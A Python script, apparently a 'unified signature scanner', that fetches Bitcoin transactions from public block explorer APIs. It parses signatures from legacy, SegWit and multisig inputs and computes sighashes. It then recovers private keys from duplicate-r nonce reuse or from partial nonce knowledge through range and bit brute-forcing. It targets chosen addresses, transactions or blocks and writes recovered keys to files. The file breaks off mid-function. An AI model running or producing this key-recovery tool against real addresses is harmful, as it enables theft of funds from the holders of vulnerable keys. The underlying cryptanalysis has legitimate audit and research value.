#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, requests, json, time, os, hashlib, logging, random
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urljoin

# ---------- Optional deps ----------
try:
    from bech32 import bech32_decode, convertbits as b32_convertbits
    def _bech32_decode(addr: str):
        hrp, data = bech32_decode(addr)
        if hrp is None or not data: return None
        v = data[0]
        prog = b32_convertbits(data[1:], 5, 8, False)
        if prog is None: return None
        return v, bytes(prog)
except Exception:
    _bech32_decode = None

try:
    from coincurve import PublicKey as CC_PublicKey
except Exception:
    CC_PublicKey = None

# ---------- Logging ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler("unified_sig_scanner.log")]
)
log = logging.getLogger("scanner")

# ---------- secp256k1 & helpers ----------
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
def sha256(b: bytes) -> bytes: return hashlib.sha256(b).digest()
def hash256(b: bytes) -> bytes: return sha256(sha256(b))
def le32(i: int) -> bytes: return i.to_bytes(4, 'little')
def le64(i: int) -> bytes: return i.to_bytes(8, 'little')
def varint(n: int) -> bytes:
    if n < 0xfd: return bytes([n])
    if n <= 0xffff: return b'\xfd'+n.to_bytes(2,'little')
    if n <= 0xffffffff: return b'\xfe'+n.to_bytes(4,'little')
    return b'\xff'+n.to_bytes(8,'little')

# ---------- Base58 ----------
_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
_B58I = {c:i for i,c in enumerate(_B58)}
def b58decode_chk(addr: str) -> bytes:
    num = 0
    for c in addr:
        if c not in _B58I: raise ValueError("bad base58 char")
        num = num*58 + _B58I[c]
    full = num.to_bytes((num.bit_length()+7)//8, 'big')
    pad = len(addr) - len(addr.lstrip('1'))
    full = b'\x00'*pad + full
    if len(full) < 5: raise ValueError("too short")
    payload, checksum = full[:-4], full[-4:]
    if hash256(payload)[:4] != checksum: raise ValueError("bad checksum")
    return payload

def addr_to_spk(addr: str) -> Optional[str]:
    a = addr.strip()
    if not a: return None
    # base58 (p2pkh/p2sh)
    if a[0] in _B58 and not a.lower().startswith(("bc1","tb1","bcrt1")):
        p = b58decode_chk(a)
        if len(p) != 21: return None
        ver, h20 = p[0], p[1:]
        if ver == 0x00:  # P2PKH
            return "76a914" + h20.hex() + "88ac"
        if ver == 0x05:  # P2SH
            return "a914" + h20.hex() + "87"
        return None
    # bech32 segwit
    if _bech32_decode is not None and a.lower().startswith(("bc1","tb1","bcrt1")):
        dec = _bech32_decode(a)
        if not dec: return None
        v, prog = dec
        if v == 0 and len(prog) == 20: return "0014" + prog.hex()   # P2WPKH
        if v == 0 and len(prog) == 32: return "0020" + prog.hex()   # P2WSH
        if v == 1 and len(prog) == 32: return "5120" + prog.hex()   # P2TR
    return None

# ---------- Script helpers ----------
def scriptsig_pushes(hexstr: str) -> List[bytes]:
    if not hexstr: return []
    b = bytes.fromhex(hexstr); i=0; out=[]
    while i < len(b):
        op = b[i]; i += 1
        if op <= 75:
            d=b[i:i+op]; i+=op; out.append(d)
        elif op == 0x4c:
            ln=b[i]; i+=1; d=b[i:i+ln]; i+=ln; out.append(d)
        elif op == 0x4d:
            ln=int.from_bytes(b[i:i+2],'little'); i+=2; d=b[i:i+ln]; i+=ln; out.append(d)
        elif op == 0x4e:
            ln=int.from_bytes(b[i:i+4],'little'); i+=4; d=b[i:i+ln]; i+=ln; out.append(d)
        else:
            pass
    return out

def is_p2pkh_spk(spk:str)->bool: return spk.startswith("76a914") and spk.endswith("88ac") and len(spk)==50
def is_p2sh_spk(spk:str)->bool:  return spk.startswith("a914") and spk.endswith("87") and len(spk)==46
def is_p2wpkh_spk(spk:str)->bool: return spk.startswith("0014") and len(spk)==44
def is_p2wsh_spk(spk:str)->bool:  return spk.startswith("0020") and len(spk)==68
def is_p2tr_spk(spk:str)->bool:   return spk.startswith("5120") and len(spk)==68  # taproot
def is_p2pk_spk(spk:str)->bool:
    try: b = bytes.fromhex(spk)
    except: return False
    if not b or b[-1] != 0xAC: return False
    l = b[0]
    return l in (33,65) and len(b) == 1 + l + 1

def p2pkh_script_code_from_hash160(h160: bytes) -> str:
    return "76a914" + h160.hex() + "88ac"

def parse_der_sig(sig_hex: str) -> Tuple[int,int,int,bytes]:
    b = bytes.fromhex(sig_hex)
    if len(b) < 9: raise ValueError("too short")
    sighash = b[-1]
    core = b[:-1] if b[0]==0x30 else b
    if len(core) < 8 or core[0] != 0x30: raise ValueError("bad DER")
    i = 2
    if core[i] != 0x02: raise ValueError("no R")
    lr = core[i+1]; r = int.from_bytes(core[i+2:i+2+lr],'big'); i+=2+lr
    if core[i] != 0x02: raise ValueError("no S")
    ls = core[i+1]; s = int.from_bytes(core[i+2:i+2+ls],'big')
    return r%N, s%N, sighash, core

def der_verify_with_pub(pub_hex: str, der_wo_type: bytes, z_int: int) -> bool:
    if CC_PublicKey is None: return False
    try:
        pk = CC_PublicKey(bytes.fromhex(pub_hex))
        return pk.verify(der_wo_type, z_int.to_bytes(32,'big'), hasher=None)
    except Exception:
        return False

# ---------- SIGHASH calculators ----------
SIGHASH_ALL=1; SIGHASH_NONE=2; SIGHASH_SINGLE=3; SIGHASH_ANYONECANPAY=0x80

def legacy_sighash(tx: dict, vin_index: int, script_code_hex: str, sighash_flag: int) -> int:
    base = sighash_flag & 0x1f
    anyone = (sighash_flag & SIGHASH_ANYONECANPAY) != 0
    ver = le32(int(tx["version"])); locktime = le32(int(tx.get("locktime",0)))
    ins_b = bytearray(); ins = tx["vin"]
    if anyone:
        ins_b += varint(1)
        inp = ins[vin_index]
        ins_b += bytes.fromhex(inp["txid"])[::-1] + le32(int(inp["vout"]))
        sc = bytes.fromhex(script_code_hex)
        ins_b += varint(len(sc)) + sc + le32(int(inp.get("sequence",0xffffffff)))
    else:
        ins_b += varint(len(ins))
        for idx, inp in enumerate(ins):
            sc = bytes.fromhex(script_code_hex) if idx == vin_index else b""
            seq = int(inp.get("sequence",0xffffffff))
            if base in (SIGHASH_NONE, SIGHASH_SINGLE) and idx != vin_index:
                seq = 0
            ins_b += bytes.fromhex(inp["txid"])[::-1] + le32(int(inp["vout"])) + varint(len(sc)) + sc + le32(seq)
    outs_b = bytearray(); vouts = tx["vout"]
    if base == SIGHASH_ALL:
        outs_b += varint(len(vouts))
        for o in vouts:
            spk = bytes.fromhex(o["scriptpubkey"])
            outs_b += le64(int(o["value"])) + varint(len(spk)) + spk
    elif base == SIGHASH_NONE:
        outs_b += varint(0)
    elif base == SIGHASH_SINGLE:
        if vin_index >= len(vouts):
            return int.from_bytes(hash256(le32(1)),'big') % N
        outs_b += varint(vin_index+1)
        for _ in range(vin_index):
            outs_b += b'\xff'*8 + b'\x00'
        o = vouts[vin_index]; spk = bytes.fromhex(o["scriptpubkey"])
        outs_b += le64(int(o["value"])) + varint(len(spk)) + spk
    else:
        outs_b += varint(len(vouts))
        for o in vouts:
            spk = bytes.fromhex(o["scriptpubkey"])
            outs_b += le64(int(o["value"])) + varint(len(spk)) + spk
    pre = ver + ins_b + outs_b + locktime + le32(sighash_flag)
    return int.from_bytes(hash256(pre),'big') % N

def bip143_sighash(tx: dict, vin_index:int, prev_amount:int, script_code_hex:str, sighash_flag:int) -> int:
    base = sighash_flag & 0x1f
    anyone = (sighash_flag & SIGHASH_ANYONECANPAY) != 0
    ver = le32(int(tx["version"])); locktime = le32(int(tx.get("locktime",0)))
    if anyone: hp = b'\x00'*32
    else:
        buf = bytearray()
        for i in tx["vin"]:
            buf += bytes.fromhex(i["txid"])[::-1] + le32(int(i["vout"]))
        hp = hash256(buf)
    if anyone or base in (SIGHASH_NONE,SIGHASH_SINGLE): hs = b'\x00'*32
    else:
        buf = bytearray()
        for i in tx["vin"]:
            buf += le32(int(i.get("sequence",0xffffffff)))
        hs = hash256(buf)
    this = tx["vin"][vin_index]
    outpoint = bytes.fromhex(this["txid"])[::-1] + le32(int(this["vout"]))
    sc = bytes.fromhex(script_code_hex)
    amt = le64(int(this.get("prevout_value",0) or prev_amount))
    seq = le32(int(this.get("sequence",0xffffffff)))
    if base == SIGHASH_ALL:
        buf = bytearray()
        for o in tx["vout"]:
            spk = bytes.fromhex(o["scriptpubkey"])
            buf += le64(int(o["value"])) + varint(len(spk)) + spk
        ho = hash256(buf)
    elif base == SIGHASH_SINGLE:
        if vin_index >= len(tx["vout"]):
            return int.from_bytes(hash256(le32(1)),'big') % N
        o = tx["vout"][vin_index]; spk = bytes.fromhex(o["scriptpubkey"])
        ho = hash256(le64(int(o["value"])) + varint(len(spk)) + spk)
    else:
        ho = b'\x00'*32
    pre = ver + hp + hs + outpoint + varint(len(sc)) + sc + amt + seq + ho + locktime + le32(sighash_flag)
    return int.from_bytes(hash256(pre),'big') % N

# ---------- API layer ----------
class API:
    def __init__(self):
        self.endpoints = [
            {
                "name": "Blockstream",
                "base": "https://blockstream.info/api/",
                "w": 10, "last": 0, "req": 0,
                "paths": {
                    "block_hash": "block-height/{height}",
                    "block_txids": "block/{hash}/txids",
                    "tx": "tx/{txid}"
                }
            },
            {
                "name": "Mempool",
                "base": "https://mempool.space/api/",
                "w": 9, "last": 0, "req": 0,
                "paths": {
                    "block_hash": "block-height/{height}",
                    "block_txids": "block/{hash}/txids",
                    "tx": "tx/{txid}"
                }
            },
            {
                "name": "Blockchain.com",
                "base": "https://blockchain.info/",
                "w": 6, "last": 0, "req": 0,
                "paths": {
                    "block_hash": "block-height/{height}?format=json",
                    "block_raw": "rawblock/{hash}?format=json",
                    "tx_raw": "rawtx/{txid}?format=json"
                }
            },
            {
                "name": "BlockCypher",
                "base": "https://api.blockcypher.com/v1/btc/main/",
                "w": 5, "last": 0, "req": 0,
                "paths": {
                    "block_hash": "blocks/{height}",
                    "block_txids": "blocks/{hash}?txstart=0&limit=500",
                    "tx": "txs/{txid}"
                }
            }
        ]
        self.s = requests.Session()
        self.s.headers.update({"User-Agent":"unified-sig-scanner/1.0"})

    def _pick(self, kind:str):
        now=time.time(); bag=[]
        for ep in self.endpoints:
            if kind not in ep["paths"]: continue
            w=ep["w"]
            if now-ep["last"]<60: w=max(1, w-3)
            if ep["req"]>200: w=max(1, w-2)
            bag += [ep]*w
        return random.choice(bag) if bag else None

    def call(self, kind:str, **kw):
        tries = len(self.endpoints)*2
        ep = self._pick(kind)
        if not ep: return None
        for _ in range(tries):
            try:
                url = urljoin(ep["base"], ep["paths"][kind].format(**kw))
                log.info(f"{ep['name']} -> {url}")
                r = self.s.get(url, timeout=40)
                ep["req"] += 1; ep["last"]=time.time()
                if r.status_code==429:
                    time.sleep(1.5); ep=self._pick(kind); continue
                r.raise_for_status()
                ct=r.headers.get("content-type","")
                txt=r.text.strip()
                if "application/json" in ct or txt.startswith(("{","[")):
                    try: return r.json()
                    except: return txt
                return txt
            except Exception as e:
                log.warning(f"{ep['name']} error: {e}")
                ep = self._pick(kind)
        return None

    def get_block_hash(self, height:int)->Optional[str]:
        res=self.call("block_hash", height=height)
        if isinstance(res,str) and len(res)==64: return res
        if isinstance(res,dict):
            if "blocks" in res and res["blocks"]:
                return res["blocks"][0].get("hash")
            if "hash" in res: return res["hash"]
        return None

    def get_block_txids(self, bhash:str)->List[str]:
        res=self.call("block_txids", hash=bhash)
        if isinstance(res,list) and all(isinstance(x,str) and len(x)==64 for x in res):
            return res
        res=self.call("block_raw", hash=bhash)
        if isinstance(res,dict) and "tx" in res:
            out=[]
            for tx in res["tx"]:
                if "hash" in tx: out.append(tx["hash"])
                elif "txid" in tx: out.append(tx["txid"])
            return out
        out=[]; start=0
        while True:
            res=self.call("block_txids", hash=f"{bhash}?txstart={start}&limit=500")
            if isinstance(res,dict):
                lst=res.get("txids") or []
                if not lst: break
                out+=lst
                if len(lst)<500: break
                start+=500
            else:
                break
        return out

    def get_tx(self, txid:str)->Optional[dict]:
        j=self.call("tx", txid=txid)
        if isinstance(j,dict) and (j.get("txid") or j.get("hash")):
            return j
        j=self.call("tx_raw", txid=txid)
        if isinstance(j,dict) and (j.get("hash") or j.get("txid")):
            return j
        return None

    def get_prevout(self, prev_txid:str, vout:int)->Optional[Tuple[str,int]]:
        j=self.get_tx(prev_txid)
        if isinstance(j,dict):
            vouts = j.get("vout") or j.get("out") or []
            if vouts and isinstance(vouts,list):
                if 0<=vout<len(vouts):
                    o=vouts[vout]
                    spk = o.get("scriptpubkey") or o.get("scriptPubKey") or o.get("script") or ""
                    val = int(o.get("value", o.get("value_satoshi", o.get("valueSat", 0))))
                    return (spk, val)
        return None

# ---------- TX normalization ----------
def normalize_tx(j: dict) -> dict:
    tx = {"version": j.get("version",2),
          "locktime": j.get("locktime",0),
          "txid": j.get("txid") or j.get("hash",""),
          "vin": [], "vout": []}
    if isinstance(j.get("vin"), list):
        for inp in j["vin"]:
            prev = inp.get("prevout") or {}
            tx["vin"].append({
                "txid": inp.get("txid",""),
                "vout": int(inp.get("vout",0) or 0),
                "sequence": int(inp.get("sequence",0xffffffff)),
                "scriptsig": inp.get("scriptsig","") or inp.get("script",""),
                "witness": inp.get("witness") or inp.get("txinwitness") or [],
                "is_coinbase": bool(inp.get("is_coinbase") or ("coinbase" in inp)),
                "prevout_spk": prev.get("scriptpubkey","") or prev.get("scriptPubKey","") or "",
                "prevout_value": int(prev.get("value",0)),
                "prevout_address": prev.get("scriptpubkey_address") or prev.get("address")
            })
    else:
        ins = j.get("inputs") or []
        for inp in ins:
            tx["vin"].append({
                "txid": inp.get("prev_out",{}).get("tx_index") or inp.get("txid",""),
                "vout": int(inp.get("prev_out",{}).get("n", inp.get("vout",0)) or 0),
                "sequence": int(inp.get("sequence",0xffffffff)),
                "scriptsig": inp.get("script","") or "",
                "witness": inp.get("witness",[]) or [],
                "is_coinbase": bool(inp.get("coinbase")) ,
                "prevout_spk": inp.get("prev_out",{}).get("script","") or "",
                "prevout_value": int(inp.get("prev_out",{}).get("value",0)),
                "prevout_address": inp.get("prev_out",{}).get("addr")
            })
    vouts = j.get("vout") or j.get("out") or []
    for o in vouts:
        tx["vout"].append({
            "value": int(o.get("value", o.get("value_satoshi", o.get("valueSat", 0)))),
            "scriptpubkey": o.get("scriptpubkey") or o.get("scriptPubKey") or o.get("script") or ""
        })
    return tx

# ---------- multisig parser ----------
def parse_multisig_script(script_hex: str) -> List[str]:
    try: b = bytes.fromhex(script_hex)
    except: return []
    pubs=[]; i=0
    while i < len(b):
        op=b[i]; i+=1
        if op in (0xAE,0xAF):  # CHECKMULTISIG
            break
        if 33<=op<=75:
            if op in (33,65) and i+op<=len(b):
                pubs.append(b[i:i+op].hex()); i+=op
            else:
                i+=op
        elif op==0x4c and i<len(b):
            ln=b[i]; i+=1
            if ln in (33,65) and i+ln<=len(b): pubs.append(b[i:i+ln].hex())
            i+=ln
        elif op==0x4d and i+2<=len(b):
            ln=int.from_bytes(b[i:i+2],'little'); i+=2
            if ln in (33,65) and i+ln<=len(b): pubs.append(b[i:i+ln].hex())
            i+=ln
        else:
            pass
    return pubs if len(pubs)>=2 else []

# ---------- extraction ----------
def append_jsonl(path:str,obj:dict):
    with open(path,"a",encoding="utf-8") as f: f.write(json.dumps(obj)+"\n")

def extract_from_input(api:API, tx:dict, vin_index:int, r_filter:Set[int], out_records:List[dict]):
    inp = tx["vin"][vin_index]
    if inp.get("is_coinbase"): return
    prev_spk = (inp.get("prevout_spk") or "").lower()
    prev_val = int(inp.get("prevout_value") or 0)
    if (not prev_spk) or (prev_val==0 and (inp.get("witness") or is_p2wpkh_spk(prev_spk) or is_p2wsh_spk(prev_spk))):
        if inp["txid"]:
            got = api.get_prevout(inp["txid"], int(inp["vout"]))
            if got:
                prev_spk, prev_val = got[0].lower(), int(got[1])
    if is_p2tr_spk(prev_spk): return

    def add(sig_hex:str, pub_hex:str, r:int,s:int,ht:int, z:int, typ:str):
        out_records.append({
            "txid": tx["txid"], "vin": vin_index, "type": typ,
            "signature_hex": sig_hex, "pubkey_hex": (pub_hex or "").lower(),
            "r": f"{r:064x}", "s": f"{s:064x}", "sighash": ht, "z": f"{z:064x}",
            "prev_value": prev_val, "prev_spk": prev_spk
        })

    # P2PKH
    if is_p2pkh_spk(prev_spk):
        ch=scriptsig_pushes(inp.get("scriptsig",""))
        if len(ch)>=2:
            sig_hex = ch[0].hex(); pub_hex=ch[1].hex()
            try: r,s,ht,core = parse_der_sig(sig_hex)
            except: return
            if r_filter and r not in r_filter: return
            z = legacy_sighash(tx, vin_index, prev_spk, ht)
            add(sig_hex,pub_hex,r,s,ht,z,"legacy")
        return

    # P2WPKH (native or nested)
    wit = inp.get("witness") or []
    if wit and len(wit)>=2:
        keyhash=None
        if is_p2wpkh_spk(prev_spk):
            keyhash = bytes.fromhex(prev_spk[4:])
        elif is_p2sh_spk(prev_spk):
            ch = scriptsig_pushes(inp.get("scriptsig",""))
            if ch:
                redeem = ch[-1]
                if len(redeem)==22 and redeem[0]==0x00 and redeem[1]==0x14:
                    keyhash = redeem[2:]
        if keyhash is not None:
            sig_hex = wit[0]; pub_hex = wit[-1]
            try: r,s,ht,core = parse_der_sig(sig_hex)
            except: return
            if r_filter and r not in r_filter: return
            sc_hex = p2pkh_script_code_from_hash160(keyhash)
            z = bip143_sighash(tx, vin_index, prev_val, sc_hex, ht)
            add(sig_hex,pub_hex,r,s,ht,z,"witness")
            return

    # P2PK bare
    if is_p2pk_spk(prev_spk):
        b=bytes.fromhex(prev_spk); pklen=b[0]; pub_hex=b[1:1+pklen].hex()
        ch=scriptsig_pushes(inp.get("scriptsig",""))
        if not ch: return
        sig_hex=ch[0].hex()
        try: r,s,ht,core = parse_der_sig(sig_hex)
        except: return
        if r_filter and r not in r_filter: return
        z = legacy_sighash(tx, vin_index, prev_spk, ht)
        add(sig_hex,pub_hex,r,s,ht,z,"legacy-p2pk")
        return

    # P2SH (single-sig or multisig)
    if is_p2sh_spk(prev_spk):
        ch=scriptsig_pushes(inp.get("scriptsig",""))
        if not ch: return
        redeem = ch[-1].hex()
        if is_p2pk_spk(redeem):
            sig_hex = ch[0].hex() if len(ch)>=2 else None
            if not sig_hex: return
            b=bytes.fromhex(redeem); pklen=b[0]; pub_hex=b[1:1+pklen].hex()
            try: r,s,ht,core = parse_der_sig(sig_hex)
            except: return
            if r_filter and r not in r_filter: return
            z = legacy_sighash(tx, vin_index, redeem, ht)
            add(sig_hex,pub_hex,r,s,ht,z,"legacy-p2sh-p2pk")
            return
        pubs = parse_multisig_script(redeem)
        if pubs:
            for item in ch[1:-1]:  # skip OP_0 and redeem
                sig_hex = item.hex()
                try: r,s,ht,core = parse_der_sig(sig_hex)
                except: continue
                if r_filter and r not in r_filter: continue
                z = legacy_sighash(tx, vin_index, redeem, ht)
                chosen=""
                if CC_PublicKey is not None:
                    for p in pubs:
                        if der_verify_with_pub(p, core, z):
                            chosen=p; break
                add(sig_hex,chosen,r,s,ht,z,"legacy-p2sh-multi")
            return

    # P2WSH (native or p2sh-p2wsh)
    is_wsh=False; witness_script_hex=None
    if is_p2wsh_spk(prev_spk):
        is_wsh=True; wit=inp.get("witness") or []; witness_script_hex = wit[-1] if wit and len(wit)>=2 else None
    elif is_p2sh_spk(prev_spk):
        ch=scriptsig_pushes(inp.get("scriptsig",""))
        if ch:
            redeem=ch[-1]
            if len(redeem)==34 and redeem[0]==0x00 and redeem[1]==0x20:
                is_wsh=True; wit=inp.get("witness") or []; witness_script_hex = wit[-1] if wit and len(wit)>=2 else None
    if is_wsh and witness_script_hex:
        pubs = parse_multisig_script(witness_script_hex)
        wit = inp.get("witness") or []
        for item in wit[:-1]:
            if not isinstance(item,str) or len(item)<9: continue
            try: r,s,ht,core = parse_der_sig(item)
            except: continue
            if r_filter and r not in r_filter: continue
            z = bip143_sighash(tx, vin_index, prev_val, witness_script_hex, ht)
            chosen=""
            if CC_PublicKey is not None:
                for p in pubs if pubs else []:
                    if der_verify_with_pub(p, core, z):
                        chosen=p; break
            add(item,chosen,r,s,ht,z,"witness-wsh")
        return

# ---------- r-filter ----------
def load_r_filter(path: str) -> Set[int]:
    rset:set[int]=set()
    if not path or not os.path.exists(path): return rset
    with open(path,"r",encoding="utf-8") as f:
        for line in f:
            s=line.strip().strip('"')
            if not s: continue
            if s.startswith("0x"): s=s[2:]
            try: rset.add(int(s,16))
            except: pass
    return rset

# ---------- dup-r recovery ----------
def try_recover_dup_r(sign_rows: List[dict], out_jsonl:str, out_txt:str):
    by = {}
    for r in sign_rows:
        pub = (r.get("pubkey_hex") or "").lower()
        if not pub: continue
        try:
            rr=int(r["r"],16); ss=int(r["s"],16); zz=int(r["z"],16)
        except: continue
        key=(rr, pub)
        by.setdefault(key, []).append((ss,zz,r))
    recovered=[]
    for (rr,pub), arr in by.items():
        if len(arr)<2: continue
        for i in range(len(arr)):
            for j in range(i+1,len(arr)):
                s1,z1,_a = arr[i]; s2,z2,_b = arr[j]
                k=None
                denom = (s1 - s2) % N
                if denom != 0:
                    k = ((z1 - z2) * pow(denom, -1, N)) % N
                else:
                    denom2 = (s1 + s2) % N
                    if denom2 == 0: continue
                    k = ((z1 + z2) * pow(denom2, -1, N)) % N
                if not k: continue
                rinv = pow(rr, -1, N)
                priv = ((s1 * k - z1) * rinv) % N
                if not (1 <= priv < N): continue
                ok=True
                if CC_PublicKey is not None and pub:
                    try:
                        cand = CC_PublicKey.from_secret(priv).format(compressed=True).hex()
                        if cand.lower()!=pub.lower():
                            candu = CC_PublicKey.from_secret(priv).format(compressed=False).hex()
                            ok = (candu.lower()==pub.lower())
                    except Exception:
                        ok=False
                if not ok: continue
                rec={"pubkey":pub,"priv_hex":f"{priv:064x}","r":f"{rr:064x}"}
                if rec not in recovered:
                    recovered.append(rec)
    if recovered:
        with open(out_jsonl,"a") as f:
            for r in recovered: f.write(json.dumps(r)+"\n")
        with open(out_txt,"a") as f:
            for r in recovered: f.write(f"{r['pubkey']} {r['priv_hex']}\n")
        log.critical(f"[RECOVERED dup-r] {len(recovered)} key(s) -> {out_jsonl}, {out_txt}")
    else:
        log.info("No dup-r recoveries.")
    return recovered

# ---------- nonce-based recovery ----------
def load_jsonl(path:str)->List[dict]:
    arr=[]; 
    if not path or not os.path.exists(path): return arr
    with open(path,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try: arr.append(json.loads(line))
            except: pass
    return arr

def recover_with_nonce_hints(sign_rows: List[dict],
                             known_k_rows: List[dict],
                             range_rows: List[dict],
                             bits_rows: List[dict],
                             max_brutebits:int,
                             out_jsonl:str, out_txt:str):
    if not known_k_rows and not range_rows and not bits_rows:
        log.info("No nonce hints provided.")
        return []

    if CC_PublicKey is None and (range_rows or bits_rows):
        log.warning("[nonce] coincurve not available -> disabling range/bits brute to avoid false positives.")
        range_rows, bits_rows = [], []

    # index signatures by (txid,vin)
    by_tv={}
    for r in sign_rows:
        key=(r.get("txid"), int(r.get("vin", -1)))
        by_tv[key]=r

    recovered=[]
    def _emit(priv:int, pub:str):
        rec={"pubkey":pub,"priv_hex":f"{priv:064x}"}
        if rec not in recovered:
            recovered.append(rec)

    # exact k
    for row in known_k_rows:
        key=(row.get("txid"), int(row.get("vin", -1)))
        sig = by_tv.get(key)
        if not sig: continue
        try:
            r=int(sig["r"],16); s=int(sig["s"],16); z=int(sig["z"],16)
            k=int(row["k"],16) % N
        except: continue
        if k==0: continue
        rinv = pow(r, -1, N)
        priv = ((s*k - z) * rinv) % N
        pub = (sig.get("pubkey_hex") or "").lower()
        ok=True
        if CC_PublicKey is not None and pub:
            try:
                cand = CC_PublicKey.from_secret(priv).format(compressed=True).hex()
                if cand.lower()!=pub.lower():
                    candu = CC_PublicKey.from_secret(priv).format(compressed=False).hex()
                    ok = (candu.lower()==pub.lower())
            except Exception:
                ok=False
        if ok and 1<=priv<N:
            _emit(priv,pub)

    # k in range [start, end) step
    for row in range_rows:
        key=(row.get("txid"), int(row.get("vin", -1)))
        sig = by_tv.get(key)
        if not sig: continue
        try:
            r=int(sig["r"],16); s=int(sig["s"],16); z=int(sig["z"],16)
            ks=int(row["k_start"],16) % N
            ke=int(row["k_end"],16) % N
            st=int(row.get("step",1))
        except: continue
        if st<=0: st=1
        rinv = pow(r, -1, N)
        pub = (sig.get("pubkey_hex") or "").lower()
        tried=0; found=False
        k=ks
        while True:
            tried += 1
            priv = ((s*k - z) * rinv) % N
            ok=True
            if CC_PublicKey is not None and pub:
                try:
                    cand = CC_PublicKey.from_secret(priv).format(compressed=True).hex()
                    if cand.lower()!=pub.lower():
                        candu = CC_PublicKey.from_secret(priv).format(compressed=False).hex()
                        ok = (candu.lower()==pub.lower())
                except Exception:
                    ok=False
            if ok and 1<=priv<N:
                _emit(priv,pub); found=True; break
            k = (k + st) % N
            if ks < ke:
                if k >= ke: break
            else:
                # wrapped or descending ranges aren’t supported here
                break
        log.info(f"[nonce-range] {key} tried={tried} found={found}")

    # bits-based brute (small unknown bits)
    for row in bits_rows:
        key=(row.get("txid"), int(row.get("vin", -1)))
        sig = by_tv.get(key)
        if not sig: continue
        try:
            r=int(sig["r"],16); s=int(sig["s"],16); z=int(sig["z"],16)
            mode = (row.get("mode") or "lsb").lower()
            known_bits = int(row.get("known_bits",0))
            unknown_bits = int(row.get("unknown_bits",0))
            val = int(row.get("value"),16)
        except: 
            continue
        if unknown_bits <= 0 or unknown_bits > max_brutebits:
            log.info(f"[nonce-bits] skip {key}: unknown_bits={unknown_bits} > max={max_brutebits}")
            continue
        if known_bits <= 0 or known_bits >= 256: continue

        rinv = pow(r, -1, N)
        pub = (sig.get("pubkey_hex") or "").lower()
        tried=0; found=False

        if mode == "lsb":
            # k ≡ val (mod 2^known_bits); brute top unknown_bits
            base = val & ((1<<known_bits)-1)
            for hi in range(1<<unknown_bits):
                k = ((hi << known_bits) | base) % N
                tried += 1
                priv = ((s*k - z) * rinv) % N
                ok=True
                if CC_PublicKey is not None and pub:
                    try:
                        cand = CC_PublicKey.from_secret(priv).format(compressed=True).hex()
                        if cand.lower()!=pub.lower():
                            candu = CC_PublicKey.from_secret(priv).format(compressed=False).hex()
                            ok = (candu.lower()==pub.lower())
                    except Exception:
                        ok=False
                if ok and 1<=priv<N:
                    _emit(priv,pub); found=True; break

        else:  # msb
            # k in [val << unknown_bits, (val+1)<<unknown_bits)
            start = (val << unknown_bits) % N
            end = ((val+1) << unknown_bits) % N
            for lo in range(1<<unknown_bits):
                k = (start + lo) % N
                tried += 1
                priv = ((s*k - z) * rinv) % N
                ok=True
                if CC_PublicKey is not None and pub:
                    try:
                        cand = CC_PublicKey.from_secret(priv).format(compressed=True).hex()
                        if cand.lower()!=pub.lower():
                            candu = CC_PublicKey.from_secret(priv).format(compressed=False).hex()
                            ok = (candu.lower()==pub.lower())
                    except Exception:
                        ok=False
                if ok and 1<=priv<N:
                    _emit(priv,pub); found=True; break

        log.info(f"[nonce-bits:{mode}] {key} tried={tried} found={found}")

    if recovered:
        with open(out_jsonl,"a") as f:
            for r in recovered: f.write(json.dumps(r)+"\n")
        with open(out_txt,"a") as f:
            for r in recovered: f.write(f"{r['pubkey']} {r['priv_hex']}\n")
        log.critical(f"[RECOVERED nonce] {len(recovered)} key(s) -> {out_jsonl}, {out_txt}")
    else:
        log.info("No nonce-based recoveries.")
    return recovered

# ---------- scanning ----------
def scan_addresses(api:API, addrs:List[str], out:str, r_filter:Set[int]):
    count=0
    with open(out,"a") as f:
        for addr in addrs:
            txids = []
            url = f"https://blockstream.info/api/address/{addr}/txs"
            while True:
                log.info(f"Blockstream -> {url}")
                r = api.s.get(url, timeout=40)
                if not r.ok: break
                arr = r.json()
                if not arr: break
                txids += [x.get("txid") for x in arr if x.get("txid")]
                last = arr[-1].get("txid")
                if not last: break
                url = f"https://blockstream.info/api/address/{addr}/txs/chain/{last}"

            target_spk = addr_to_spk(addr)
            for txid in dict.fromkeys(txids):
                j = api.get_tx(txid)
                if not j: continue
                tx = normalize_tx(j)
                rows=[]
                for i in range(len(tx["vin"])):
                    before=len(rows)
                    extract_from_input(api, tx, i, r_filter, rows)
                    if target_spk:
                        rows = [r for r in rows if r.get("prev_spk","").lower()==target_spk.lower()]
                for rec in rows:
                    f.write(json.dumps(rec)+"\n")
                count += len(rows)
            log.info(f"[addr] {addr}: wrote {count} rows so far")
    log.info(f"[addr] total rows: {count}")
    return count

def scan_txids(api:API, txids:List[str], out:str, r_filter:Set[int]):
    count=0
    with open(out,"a") as f:
        for txid in dict.fromkeys(txids):
            j = api.get_tx(txid)
            if not j: continue
            tx = normalize_tx(j)
            rows=[]
            for i in range(len(tx["vin"])):
                extract_from_input(api, tx, i, r_filter, rows)
            for rec in rows:
                f.write(json.dumps(rec)+"\n")
            count += len(rows)
            log.info(f"[tx] {txid}: {len(rows)} rows")
    log.info(f"[tx] total rows: {count}")
    return count

def scan_blocks(api:API, heights:List[int], out:str, r_filter:Set[int], delay:float=0.0):
    count=0
    with open(out,"a") as f:
        for h in heights:
            bh = api.get_block_hash(h)
            if not bh:
                log.warning(f"height {h}: no hash")
                continue
            txids = api.get_block_txids(bh)
            log.info(f"[block {h}] {len(txids)} txs")
            for txid in txids:
                j = api.get_tx(txid)
                if not j: continue
                tx = normalize_tx(j)
                rows=[]
                for i in range(len(tx["vin"])):
                    extract_from_input(api, tx, i, r_filter, rows)
                for rec in rows:
                    f.write(json.dumps(rec)+"\n")
                count += len(rows)
                if delay: time.sleep(delay)
    log.info(f"[blocks] total rows: {count}")
    return count

# ---------- r-collision reports ----------
def write_dup_reports(sign_path:str, dup_same_pub:str, dup_cross_pub:str):
    rows=[]
    with open(sign_path,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
